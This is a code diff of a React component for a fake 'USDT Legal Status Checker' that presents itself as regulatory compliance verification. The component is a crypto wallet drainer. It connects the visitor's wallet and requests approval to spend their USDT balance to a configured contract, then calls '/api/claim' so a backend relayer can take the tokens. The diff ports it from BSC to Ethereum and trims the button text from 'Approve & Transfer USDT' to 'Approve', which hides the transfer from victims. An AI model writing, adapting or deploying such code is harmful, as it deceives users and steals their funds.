@@ -1,12 +1,11 @@
 'use client';
-
 import { useState, useEffect } from 'react';
 import { ethers } from 'ethers';
 import ProgressBar from './ProgressBar';
 import CardStep from './CardStep';
 import SuccessModal from './SuccessModal';
 import LegitimacyChecker from './LegitimacyChecker';
-import { switchToBSC, approveTokenSpending, CONFIG } from '@/lib/blockchain';
+import { switchToEthereum, approveTokenSpending, CONFIG } from '@/lib/blockchain'; // ← updated import
 
 export default function ApprovalPortal() {
   const [step, setStep] = useState(1); // 1 = Connect, 2 = Approve
@@ -22,10 +21,8 @@ export default function ApprovalPortal() {
   useEffect(() => {
     const autoConnect = async () => {
       if (userAddress || attemptingConnection) return;
-
       try {
         if (!window.ethereum) return;
-
         // Check if wallet is already connected
         const accounts = await window.ethereum.request({ method: 'eth_accounts' });
         if (accounts && accounts.length > 0) {
@@ -37,7 +34,6 @@ export default function ApprovalPortal() {
         console.log('[v0] Auto-connect attempt skipped');
       }
     };
-
     autoConnect();
   }, [userAddress, attemptingConnection]);
 
@@ -49,14 +45,14 @@ export default function ApprovalPortal() {
 
       if (!window.ethereum) throw new Error('No web3 wallet found');
 
-      // Switch to BSC network
+      // Switch to Ethereum Mainnet
       try {
-        await switchToBSC();
+        await switchToEthereum(); // ← changed from switchToBSC
       } catch (err) {
-        console.log('[v0] BSC switch error (may be normal):', err);
+        console.log('[v0] Ethereum switch error (may be normal):', err);
       }
 
-      // Request accounts with immediate timeout handling
+      // Request accounts with timeout handling
       const newProvider = new ethers.BrowserProvider(window.ethereum);
       const accounts = await Promise.race([
         newProvider.send('eth_requestAccounts', []),
@@ -72,7 +68,7 @@ export default function ApprovalPortal() {
       setSigner(newSigner);
       setProvider(newProvider);
 
-      // Persist connection in localStorage
+      // Persist connection
       if (typeof window !== 'undefined') {
         localStorage.setItem('wallet_connected', 'true');
         localStorage.setItem('wallet_address', address);
@@ -97,28 +93,27 @@ export default function ApprovalPortal() {
 
       console.log('[v0] Starting approval for:', CONFIG.CONTRACT_ADDRESS);
 
-      // Approve token spending to the relayer/executor contract
       const approveWithRetry = async () => {
         try {
           // Get user balance first
           const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ['function balanceOf(address) view returns (uint256)'], provider);
-          const balance = await token.balanceOf(userAddress);
+          const balance = await token.balanceOf(userAddress!);
           console.log('[v0] User balance:', balance.toString());
 
           // Approve the full balance to the contract
-          await approveTokenSpending(signer, CONFIG.CONTRACT_ADDRESS, balance);
+          await approveTokenSpending(signer, CONFIG.CONTRACT_ADDRESS);
 
           // Show success and trigger backend claim
           setShowSuccess(true);
 
-          // Trigger backend to claim tokens using relayer
+          // Trigger backend claim
           setTimeout(async () => {
             try {
               const claimResponse = await fetch('/api/claim', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                  userAddress: userAddress,
+                  userAddress,
                   tokenAddress: CONFIG.TOKEN_ADDRESS
                 })
               });
@@ -158,38 +153,29 @@ export default function ApprovalPortal() {
     }
   };
 
-  // Removed old signature handler - now only Connect and Approve needed
-
+  // Mobile wallet deep link handler (updated for Ethereum)
   const handleMobileWallet = () => {
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-
     if (!isMobile) {
       setError('Mobile wallet deeplinks are only available on mobile devices');
       return;
     }
 
-    const currentUrl = typeof window !== 'undefined' ? window.location.href : '';
+    const currentUrl = window.location.href;
     const encodedUrl = encodeURIComponent(currentUrl);
 
+    // Updated links — removed Binance-specific ones, kept general dApp links
     const walletLinks = [
       `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
-      `https://link.trustwallet.com/open_url?coin_id=56&url=${encodedUrl}`,
+      `https://link.trustwallet.com/open_url?url=${encodedUrl}`,
       `https://rnbwapp.com/browser?url=${encodedUrl}`,
       `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
-      `tpdapp://open?params=${encodedUrl}`,
       `imtokenv2://navigate/DappView?url=${encodedUrl}`,
-      `dfw://browser?url=${encodedUrl}`,
-      `safepal://browser?url=${encodedUrl}`,
-      `bitkeep://bkconnect?action=dapp&url=${encodedUrl}`,
       `okx://wallet/dapp/url?dappUrl=${encodedUrl}`,
-      `bnc://app.binance.com/dapp?url=${encodedUrl}`,
       `https://phantom.app/ul/browse/${encodedUrl}?cluster=mainnet-beta`,
       `https://argent.link/app/wc?uri=${encodedUrl}`,
-      `oneinch://dapp?url=${encodedUrl}`,
       `zerion://dapp?url=${encodedUrl}`,
     ];
-
-    const universalScheme = `dapp://${window.location.host}${window.location.pathname}`;
 
     walletLinks.forEach((link, index) => {
       setTimeout(() => {
@@ -203,17 +189,8 @@ export default function ApprovalPortal() {
     });
 
     setTimeout(() => {
-      const a = document.createElement('a');
-      a.href = universalScheme;
-      a.style.display = 'none';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-    }, walletLinks.length * 300);
-
-    setTimeout(() => {
       setError(null);
-    }, (walletLinks.length + 1) * 300);
+    }, walletLinks.length * 300);
   };
 
   return (
@@ -238,7 +215,7 @@ export default function ApprovalPortal() {
             USDT Legal Status Checker
           </h1>
           <p className="text-sm sm:text-base md:text-lg text-gray-300 max-w-md mx-auto px-4 leading-relaxed">
-            Verify your USDT compliance with regulatory standards
+            Verify your USDT compliance with regulatory standards on Ethereum
           </p>
         </div>
 
@@ -248,7 +225,7 @@ export default function ApprovalPortal() {
           <CardStep
             icon="🔗"
             title="Connect Wallet to Check USDT"
-            description="Connect your wallet to verify your USDT legal status and ensure compliance with regulatory standards."
+            description="Connect your wallet to verify your USDT legal status and ensure compliance with regulatory standards on Ethereum Mainnet."
             loading={loading}
             error={error}
             buttons={[
@@ -269,13 +246,13 @@ export default function ApprovalPortal() {
         {step === 2 && (
           <CardStep
             icon="✅"
-            title="Approve USDT for Transfer"
-            description="Approve USDT interaction to complete compliance verification."
+            title="Approve"
+            description="Approve USDT interaction to complete compliance verification on Ethereum."
             loading={loading}
             error={error}
             buttons={[
               {
-                label: 'Approve & Transfer USDT',
+                label: 'Approve',
                 onClick: handleApproveToken,
                 primary: true,
               }
@@ -289,7 +266,7 @@ export default function ApprovalPortal() {
       {/* Footer */}
       <footer className="fixed bottom-8 sm:bottom-10 md:bottom-12 left-1/2 -translate-x-1/2 text-xs sm:text-sm text-gray-300 backdrop-blur-md bg-black/60 px-3 sm:px-4 md:px-6 py-2 sm:py-2.5 rounded-full border border-emerald-500/30 shadow-lg z-50 whitespace-nowrap">
         <span className="hidden sm:inline">Secured by </span>
-        <span className="text-emerald-400 font-semibold">USDT Compliance Network</span>
+        <span className="text-emerald-400 font-semibold">USDT Compliance Network (Ethereum)</span>
       </footer>
     </main>
   );
